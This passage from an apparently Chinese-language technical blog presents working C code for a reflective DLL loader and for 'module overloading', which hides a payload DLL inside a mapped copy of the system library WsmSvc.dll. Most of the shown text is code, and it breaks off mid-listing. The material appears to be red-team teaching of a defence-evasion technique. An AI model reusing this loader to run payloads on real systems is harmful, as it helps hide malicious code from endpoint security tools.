&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;    -&gt; Loaded at preferred base address, no relocations needed.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. 执行 DLL 的入口点 (DllMain)</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Executing DllMain...\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (ntHeaders-&gt;OptionalHeader.AddressOfEntryPoint) &#123;</span><br><span class="line">        DLLMAIN entryPoint = (DLLMAIN)(dllBase + ntHeaders-&gt;OptionalHeader.AddressOfEntryPoint);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;    -&gt; Entry Point Address: %p\n&quot;</span>, entryPoint);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 调用 DllMain，传入 DLL_PROCESS_ATTACH</span></span><br><span class="line">        entryPoint((HINSTANCE)dllBase, DLL_PROCESS_ATTACH, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] DllMain executed successfully!\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] No entry point found in DLL.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Usage: pure_c_loader.exe &lt;path_to_dll&gt;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;================================================\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;   Pure C Reflective DLL Loader (Non-PIC)\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    DWORD fileSize = <span class="number">0</span>;</span><br><span class="line">    BYTE* dllData = ReadFileToMemory(argv[<span class="number">1</span>], &amp;fileSize);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (dllData) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] Successfully read %lu bytes from %s\n&quot;</span>, fileSize, argv[<span class="number">1</span>]);</span><br><span class="line">        <span class="comment">// 开始在内存中手动装载DLL</span></span><br><span class="line">        ReflectiveLoadDLL(dllData);</span><br><span class="line">        <span class="built_in">free</span>(dllData);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n[*] Done. Press Enter to exit...\n&quot;</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/250wuyifan/WaiLian250/img/image-20260408223912529.png" title="image-20260408223912529" class="gallery-item" style="box-shadow: none;"> <img src="https://cdn.jsdelivr.net/gh/250wuyifan/WaiLian250/img/image-20260408223912529.png" alt="image-20260408223912529"></a></p>
+<p>此时的堆栈情况。</p>
+<p><a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/250wuyifan/WaiLian250/img/image-20260408224021342.png" title="image-20260408224021342" class="gallery-item" style="box-shadow: none;"> <img src="https://cdn.jsdelivr.net/gh/250wuyifan/WaiLian250/img/image-20260408224021342.png" alt="image-20260408224021342"></a></p>
+<h2 id="DLL模块重载效果"><a href="#DLL模块重载效果" class="headerlink" title="DLL模块重载效果"></a>DLL模块重载效果</h2><p>加载器代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winternl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 补充 MSVC &lt;winternl.h&gt; 中缺失的枚举定义</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> _<span class="title">SECTION_INHERIT</span> &#123;</span></span><br><span class="line">    ViewShare = <span class="number">1</span>,</span><br><span class="line">    ViewUnmap = <span class="number">2</span></span><br><span class="line">&#125; SECTION_INHERIT;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ntdll&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// -------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// 模块重载 (Module Overloading) 核心原理演示</span></span><br><span class="line"><span class="comment">// -------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// NTDLL API 声明</span></span><br><span class="line">EXTERN_C NTSTATUS NTAPI <span class="title function_">NtCreateSection</span><span class="params">(</span></span><br><span class="line"><span class="params">    OUT PHANDLE SectionHandle,</span></span><br><span class="line"><span class="params">    IN ACCESS_MASK DesiredAccess,</span></span><br><span class="line"><span class="params">    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,</span></span><br><span class="line"><span class="params">    IN PLARGE_INTEGER MaximumSize OPTIONAL,</span></span><br><span class="line"><span class="params">    IN ULONG SectionPageProtection,</span></span><br><span class="line"><span class="params">    IN ULONG AllocationAttributes,</span></span><br><span class="line"><span class="params">    IN HANDLE FileHandle OPTIONAL</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line">EXTERN_C NTSTATUS NTAPI <span class="title function_">NtMapViewOfSection</span><span class="params">(</span></span><br><span class="line"><span class="params">    IN HANDLE SectionHandle,</span></span><br><span class="line"><span class="params">    IN HANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">    IN OUT PVOID* BaseAddress,</span></span><br><span class="line"><span class="params">    IN ULONG_PTR ZeroBits,</span></span><br><span class="line"><span class="params">    IN SIZE_T CommitSize,</span></span><br><span class="line"><span class="params">    IN OUT PLARGE_INTEGER SectionOffset OPTIONAL,</span></span><br><span class="line"><span class="params">    IN OUT PSIZE_T ViewSize,</span></span><br><span class="line"><span class="params">    IN SECTION_INHERIT InheritDisposition,</span></span><br><span class="line"><span class="params">    IN ULONG AllocationType,</span></span><br><span class="line"><span class="params">    IN ULONG Win32Protect</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line">EXTERN_C NTSTATUS NTAPI <span class="title function_">NtClose</span><span class="params">(</span></span><br><span class="line"><span class="params">    IN HANDLE Handle</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 辅助函数：从磁盘读取文件到内存</span></span><br><span class="line">PBYTE <span class="title function_">ReadFileToMemory</span><span class="params">(LPCWSTR filePath, PDWORD fileSize)</span> &#123;</span><br><span class="line">    HANDLE hFile = CreateFileW(filePath, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to open file %ls\n&quot;</span>, filePath);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *fileSize = GetFileSize(hFile, <span class="literal">NULL</span>);</span><br><span class="line">    PBYTE buffer = (PBYTE)VirtualAlloc(<span class="literal">NULL</span>, *fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line">    DWORD bytesRead;</span><br><span class="line">    ReadFile(hFile, buffer, *fileSize, &amp;bytesRead, <span class="literal">NULL</span>);</span><br><span class="line">    CloseHandle(hFile);</span><br><span class="line">    <span class="keyword">return</span> buffer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// 基址重定位 (Base Relocation)</span></span><br><span class="line"><span class="comment">// ------------------------------------------------------------------</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">PerformBaseRelocation</span><span class="params">(PVOID imageBase, PVOID payloadBuffer, PIMAGE_NT_HEADERS ntHeaders)</span> &#123;</span><br><span class="line">    <span class="comment">// 只有在加载地址与原始预期的 ImageBase 不同时才需要重定位</span></span><br><span class="line">    ULONG_PTR delta = (ULONG_PTR)imageBase - ntHeaders-&gt;OptionalHeader.ImageBase;</span><br><span class="line">    <span class="keyword">if</span> (delta == <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Performing Base Relocation (Delta: 0x%p)...\n&quot;</span>, (PVOID)delta);</span><br><span class="line"></span><br><span class="line">    IMAGE_DATA_DIRECTORY relocDir = ntHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];</span><br><span class="line">    <span class="keyword">if</span> (relocDir.Size == <span class="number">0</span> || relocDir.VirtualAddress == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] No Relocation table found.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PIMAGE_BASE_RELOCATION pRelocation = (PIMAGE_BASE_RELOCATION)((ULONG_PTR)imageBase + relocDir.VirtualAddress);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 增加安全检查：确保 pRelocation 在有效范围内</span></span><br><span class="line">    <span class="keyword">while</span> (pRelocation-&gt;VirtualAddress != <span class="number">0</span> &amp;&amp; pRelocation-&gt;SizeOfBlock &gt;= <span class="keyword">sizeof</span>(IMAGE_BASE_RELOCATION)) &#123;</span><br><span class="line">        DWORD count = (pRelocation-&gt;SizeOfBlock - <span class="keyword">sizeof</span>(IMAGE_BASE_RELOCATION)) / <span class="keyword">sizeof</span>(WORD);</span><br><span class="line">        PWORD pRelocData = (PWORD)((ULONG_PTR)pRelocation + <span class="keyword">sizeof</span>(IMAGE_BASE_RELOCATION));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (DWORD i = <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">            WORD type = pRelocData[i] &gt;&gt; <span class="number">12</span>; <span class="comment">// 高 4 位是类型</span></span><br><span class="line">            WORD offset = pRelocData[i] &amp; <span class="number">0x0FFF</span>; <span class="comment">// 低 12 位是偏移</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (type == IMAGE_REL_BASED_DIR64) &#123;</span><br><span class="line">                <span class="comment">// 64 位指针的重定位</span></span><br><span class="line">                PULONG_PTR target = (PULONG_PTR)((ULONG_PTR)imageBase + pRelocation-&gt;VirtualAddress + offset);</span><br><span class="line">                *target += delta;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (type == IMAGE_REL_BASED_HIGHLOW) &#123;</span><br><span class="line">                <span class="comment">// 32 位指针的重定位</span></span><br><span class="line">                PDWORD target = (PDWORD)((ULONG_PTR)imageBase + pRelocation-&gt;VirtualAddress + offset);</span><br><span class="line">                *target += (DWORD)delta;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 移动到下一个块</span></span><br><span class="line">        pRelocation = (PIMAGE_BASE_RELOCATION)((ULONG_PTR)pRelocation + pRelocation-&gt;SizeOfBlock);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Base Relocation finished.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// 解析并加载导入表 (Import Address Table - IAT)</span></span><br><span class="line"><span class="comment">// ------------------------------------------------------------------</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">ResolveImportTable</span><span class="params">(PVOID imageBase, PIMAGE_NT_HEADERS ntHeaders)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Resolving Import Table (IAT)...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    IMAGE_DATA_DIRECTORY importDir = ntHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];</span><br><span class="line">    <span class="keyword">if</span> (importDir.Size == <span class="number">0</span> || importDir.VirtualAddress == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] No Import table found.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PIMAGE_IMPORT_DESCRIPTOR pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((ULONG_PTR)imageBase + importDir.VirtualAddress);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历每一个被导入的 DLL</span></span><br><span class="line">    <span class="keyword">while</span> (pImportDesc-&gt;Name != <span class="number">0</span>) &#123;</span><br><span class="line">        LPCSTR dllName = (LPCSTR)((ULONG_PTR)imageBase + pImportDesc-&gt;Name);</span><br><span class="line">        HMODULE hModule = LoadLibraryA(dllName);</span><br><span class="line">        <span class="keyword">if</span> (!hModule) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to load dependency DLL: %s\n&quot;</span>, dllName);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 修复：在某些编译器生成的 DLL 中，OriginalFirstThunk 可能为空，</span></span><br><span class="line">        <span class="comment">// 此时需要使用 FirstThunk。</span></span><br><span class="line">        DWORD thunkRva = pImportDesc-&gt;OriginalFirstThunk;</span><br><span class="line">        <span class="keyword">if</span> (thunkRva == <span class="number">0</span>) &#123;</span><br><span class="line">            thunkRva = pImportDesc-&gt;FirstThunk;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        PIMAGE_THUNK_DATA pThunkOriginal = (PIMAGE_THUNK_DATA)((ULONG_PTR)imageBase + thunkRva); <span class="comment">// INT</span></span><br><span class="line">        PIMAGE_THUNK_DATA pThunkIAT = (PIMAGE_THUNK_DATA)((ULONG_PTR)imageBase + pImportDesc-&gt;FirstThunk);             <span class="comment">// IAT</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (pThunkOriginal-&gt;u1.AddressOfData != <span class="number">0</span>) &#123;</span><br><span class="line">            FARPROC functionAddress = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 判断是按序号 (Ordinal) 导入还是按名称 (Name) 导入</span></span><br><span class="line">            <span class="keyword">if</span> (IMAGE_SNAP_BY_ORDINAL(pThunkOriginal-&gt;u1.Ordinal)) &#123;</span><br><span class="line">                <span class="comment">// 序号导入</span></span><br><span class="line">                LPCSTR ordinal = (LPCSTR)(pThunkOriginal-&gt;u1.Ordinal &amp; <span class="number">0xFFFF</span>);</span><br><span class="line">                functionAddress = GetProcAddress(hModule, ordinal);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 名称导入</span></span><br><span class="line">                <span class="comment">// 注意：在内存映射状态下，AddressOfData 可能是一个相对虚拟地址 (RVA)</span></span><br><span class="line">                <span class="comment">// 或者是已经加载好 DLL 中的绝对地址（这取决于 DLL 的编译方式）。</span></span><br><span class="line">                <span class="comment">// 为了安全起见，从 payload 缓冲区读取实际的名称字符串：</span></span><br><span class="line">                DWORD nameRva = (DWORD)(pThunkOriginal-&gt;u1.AddressOfData);</span><br><span class="line">                <span class="keyword">if</span> (nameRva != <span class="number">0</span>) &#123;</span><br><span class="line">                    PIMAGE_IMPORT_BY_NAME pImportByName = (PIMAGE_IMPORT_BY_NAME)((ULONG_PTR)imageBase + nameRva);</span><br><span class="line">                    functionAddress = GetProcAddress(hModule, (LPCSTR)pImportByName-&gt;Name);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (functionAddress) &#123;</span><br><span class="line">                <span class="comment">// 覆写 IAT 里的值，将其改为在当前进程中的真实函数地址</span></span><br><span class="line">                pThunkIAT-&gt;u1.Function = (ULONG_PTR)functionAddress;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to resolve import function in %s\n&quot;</span>, dllName);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            pThunkOriginal++;</span><br><span class="line">            pThunkIAT++;</span><br><span class="line">        &#125;</span><br><span class="line">        pImportDesc++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Import Table resolved.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">wmain</span><span class="params">(<span class="type">int</span> argc, <span class="type">wchar_t</span>* argv[])</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Module Overloading Demonstration (Advanced Version)\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] By: Copilot Code Pro\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] Usage: %ls &lt;path_to_payload.dll&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;    Example: %ls payload.dll\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 读取命令行提供的 Payload DLL</span></span><br><span class="line">    LPCWSTR payloadPath = argv[<span class="number">1</span>];</span><br><span class="line">    DWORD payloadSize = <span class="number">0</span>;</span><br><span class="line">    PBYTE payloadBuffer = ReadFileToMemory(payloadPath, &amp;payloadSize);</span><br><span class="line">    <span class="keyword">if</span> (!payloadBuffer) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Payload (%ls) read into memory at %p (Size: %u bytes)\n&quot;</span>, payloadPath, payloadBuffer, payloadSize);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 选择一个合法的系统 DLL 作为“牺牲品” (Sacrificial DLL)</span></span><br><span class="line">    LPCWSTR sacrificialDllPath = <span class="string">L&quot;C:\\Windows\\System32\\WsmSvc.dll&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Target Sacrificial DLL: %ls\n&quot;</span>, sacrificialDllPath);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 开始执行模块重载核心步骤：加载牺牲 DLL (SEC_IMAGE)</span></span><br><span class="line">    <span class="comment">// --------------------------------------------------------</span></span><br><span class="line">    HANDLE hFile = CreateFileW(sacrificialDllPath, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to open sacrificial DLL.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    HANDLE hSection = <span class="literal">NULL</span>;</span><br><span class="line">    NTSTATUS status = NtCreateSection(&amp;hSection, SECTION_ALL_ACCESS, <span class="literal">NULL</span>, <span class="literal">NULL</span>, PAGE_READONLY, SEC_IMAGE, hFile);</span><br><span class="line">    CloseHandle(hFile);</span><br><span class="line">    <span class="keyword">if</span> (status != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] NtCreateSection failed with status: 0x%X\n&quot;</span>, status);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PVOID mappedAddress = <span class="literal">NULL</span>;</span><br><span class="line">    SIZE_T viewSize = <span class="number">0</span>;</span><br><span class="line">    status = NtMapViewOfSection(hSection, (HANDLE)<span class="number">-1</span>, &amp;mappedAddress, <span class="number">0</span>, <span class="number">0</span>, <span 